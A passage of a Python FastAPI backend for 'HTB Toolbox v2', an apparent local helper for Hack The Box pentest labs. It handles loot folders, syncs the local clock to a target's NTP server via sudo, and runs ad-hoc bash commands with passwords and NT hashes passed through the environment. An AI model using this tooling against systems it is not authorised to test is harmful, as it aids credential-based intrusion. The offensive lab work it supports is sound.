                cfg = normalize_cfg(msg.get("cfg", {}))
                ok, message = await sync_hosts_with_script(cfg)
                await send("hosts_sync", {"ok": ok, "message": message})

            elif action == "delete_history":
                domain = msg.get("domain","").strip()
                if domain:
                    target = LOOT_DIR / Path(domain).name
                    if target.exists() and target.is_dir() and LOOT_DIR in target.parents:
                        import shutil as _shutil
                        _shutil.rmtree(target, ignore_errors=True)
                await send("history_list", {"entries": list_history_entries()})

            elif action == "load_config":
                cfg = load_saved_config()
                await send("config_loaded", {"cfg": cfg})

            elif action == "get_target_time":
                target_ip = msg.get("target","").strip()
                domain    = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                out_dir   = get_output_dir(domain) if domain else None
                offset_sec: float | None = None
                method = "unknown"
                # 1. prefer a live NTP query so the clock widget reflects the current state.
                if target_ip:
                    offset_sec, _ = await query_ntp_offset(target_ip)
                    if offset_sec is not None:
                        method = "live"
                # 2. fallback to the latest loot if live NTP is unavailable.
                if out_dir:
                    ntp_f = out_dir / "attack_checks" / "ntp_sync.txt"
                    if offset_sec is None and ntp_f.exists():
                        txt = safe_read_text(ntp_f, 4000)
                        _off = _parse_ntp_offset(txt)
                        if _off is not None:
                            offset_sec = _off
                            method = "loot"
                import time as _time
                local_ts = _time.time()
                await send("target_time", {
                    "local_ts": local_ts,
                    "offset_sec": offset_sec,
                    "method": method,
                })

            elif action == "ntp_sync_now":
                target_ip = msg.get("target","").strip()
                cfg = normalize_cfg(msg.get("cfg", {}))
                sudo_password = cfg.get("sudo_password", "")
                domain = cfg.get("domain", "")
                if not target_ip:
                    await send("ntp_sync_result", {"ok": False, "error": "IP cible manquante"})
                    continue
                ntpbin = shutil.which("ntpdate") or shutil.which("ntpdate-debian")
                if not ntpbin:
                    await send("ntp_sync_result", {"ok": False, "error": "ntpdate introuvable"})
                    continue
                try:
                    timedatectl_out = ""
                    td_cmd = ["sudo"]
                    td_stdin = None
                    td_input = None
                    if sudo_password:
                        td_cmd += ["-S", "-p", ""]
                        td_stdin = asyncio.subprocess.PIPE
                        td_input = f"{sudo_password}\n".encode()
                    td_cmd += ["timedatectl", "set-ntp", "false"]
                    try:
                        td_proc = await asyncio.create_subprocess_exec(
                            *td_cmd,
                            stdin=td_stdin,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.STDOUT)
                        td_out, _ = await asyncio.wait_for(td_proc.communicate(input=td_input), timeout=10)
                        timedatectl_out = td_out.decode("utf-8", errors="replace")
                    except Exception:
                        timedatectl_out = ""

                    cmd = ["sudo"]
                    stdin_pipe = None
                    input_data = None
                    if sudo_password:
                        cmd += ["-S", "-p", ""]
                        stdin_pipe = asyncio.subprocess.PIPE
                        input_data = f"{sudo_password}\n".encode()
                    cmd += [ntpbin, "-u", target_ip]
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdin=stdin_pipe,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.STDOUT)
                    out, _ = await asyncio.wait_for(proc.communicate(input=input_data), timeout=15)
                    txt = out.decode("utf-8", errors="replace")
                    if timedatectl_out.strip():
                        txt = "[timedatectl set-ntp false]\n" + timedatectl_out[:200] + "\n" + txt
                    ok = proc.returncode == 0 or _parse_ntp_offset(txt) is not None
                    if ok and domain:
                        out_dir = get_output_dir(domain)
                        out_dir.mkdir(parents=True, exist_ok=True)
                        (out_dir / "attack_checks").mkdir(exist_ok=True)
                        (out_dir / "attack_checks" / "ntp_sync.txt").write_text(txt[:4000])
                    await send("ntp_sync_result", {"ok": ok, "output": txt[:400],
                        "error": "" if ok else txt[:200]})
                except asyncio.TimeoutError:
                    await send("ntp_sync_result", {"ok": False, "error": "timeout ntpdate"})
                except Exception as e:
                    await send("ntp_sync_result", {"ok": False, "error": str(e)})

            elif action == "run_adhoc":
                raw_cmd = msg.get("cmd", "").strip()
                cfg = normalize_cfg(msg.get("cfg", {}))
                meta = msg.get("meta", {}) or {}
                if not raw_cmd:
                    continue
                if meta.get("manual") or meta.get("run_allowed") is False:
                    await send("tool_output", {"tool_id": "adhoc_blocked",
                        "line": "[!] Commande marquée manuelle — utilise Copier et adapte-la avant exécution.",
                        "done": True, "rc": 1})
                    continue
                domain = cfg.get("domain", "")
                out_dir = get_output_dir(domain) if domain else LOOT_DIR
                out_dir.mkdir(parents=True, exist_ok=True)
                adhoc_id = f"adhoc_{int(time.time()*1000)}"
                secrets = [cfg.get("password",""), cfg.get("nt_hash",""), cfg.get("sudo_password","")]
                await send("tool_output", {"tool_id": adhoc_id,
                    "line": f"[CMD] {mask_text(raw_cmd, *secrets)}", "done": False, "rc": None})
                try:
                    sub_env = build_shell_env(cfg)
                    exec_cmd = raw_cmd
                    if raw_cmd.startswith("sudo ") and cfg.get("sudo_password"):
                        exec_cmd = f"printf '%s\\n' \"$SUDO_PASS\" | {raw_cmd.replace('sudo ', 'sudo -S ', 1)}"
                    run_cmd_adhoc = ["stdbuf","-oL","-eL","bash","-c",exec_cmd] \
                        if shutil.which("stdbuf") else ["bash","-c",exec_cmd]
                    proc = await asyncio.create_subprocess_exec(
                        *run_cmd_adhoc,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.STDOUT,
                        env=sub_env, cwd=str(out_dir),
                        start_new_session=True)
                    active_proc = proc
                    active_tool_id = adhoc_id
                    t0 = time.monotonic()
                    async for raw in proc.stdout:
                        line = raw.decode("utf-8", errors="replace").rstrip()
                        await send("tool_output", {"tool_id": adhoc_id,
                            "line": mask_text(line, *secrets), "done": False, "rc": None})
                    await proc.wait()
                    dur = round(time.monotonic()-t0, 2)
                    active_proc = None; active_tool_id = None
                    await send("tool_output", {"tool_id": adhoc_id,
                        "line": None, "done": True,
                        "rc": proc.returncode, "duration": dur})
                except Exception as e:
                    active_proc = None; active_tool_id = None
                    await send("tool_output", {"tool_id": adhoc_id,
                        "line": f"[!] Erreur: {e}", "done": True, "rc": 1})

    except WebSocketDisconnect:
        await terminate_all_runs()
        try:
            await cleanup_tool_processes(active_tool_id)
        except Exception:
            pass
        await close_shell()
    except Exception as e: print(f"[WS] {type(e).__name__}: {e}")

@app.get("/")
async def root():
    p = BASE_DIR / "index.html"
    if not p.exists():
        return HTMLResponse("<h1>index.html manquant</h1>")
    return FileResponse(str(p), headers={
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
    })


@app.get("/loot_file")
async def loot_file(path: str):
    fp = resolve_loot_path(path)
    return FileResponse(str(fp))


@app.get("/docs/practical-guide")
async def practical_guide(lang: str = "fr"):
    use_en = str(lang or "fr").lower().startswith("en")
    path = PRACTICAL_GUIDE_EN_PATH if use_en else PRACTICAL_GUIDE_FR_PATH
    if not path.exists():
        return HTMLResponse("<h1>Guide not found</h1>", status_code=404)
    title = "HTB Toolbox — Practical Lab Guide" if use_en else "HTB Toolbox — Guide pratique lab"
    return HTMLResponse(render_markdown_document(path.read_text(errors="replace"), title))

@app.get("/api/catalog")
async def api_catalog():
    return {
        "modules": load_modules_catalog(),
        "profiles": load_profiles_catalog(),
    }

@app.get("/api/runtime")
async def api_runtime():
    return runtime_info()

@app.get("/health")
async def health():
    return {"status":"ok","script":script_available(),
            "loot_dir":str(LOOT_DIR),"timeline":len(timeline)}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8765))
    host = os.environ.get("HOST", "127.0.0.1")
    sc   = "✓ présent (utilitaires)" if script_available() else "✗ absent (/etc/hosts manuel)"
    print(f"""
╔══════════════════════════════════════════════════╗
║        HTB Toolbox v2 — Backend local            ║
╠══════════════════════════════════════════════════╣
║  URL    : http://{host}:{port}                  ║
║  Loot   : {str(LOOT_DIR):<39}║
║  Script : {sc:<39}║
╚══════════════════════════════════════════════════╝
""")
    uvicorn.run(app, host=host, port=port, log_level="warning")
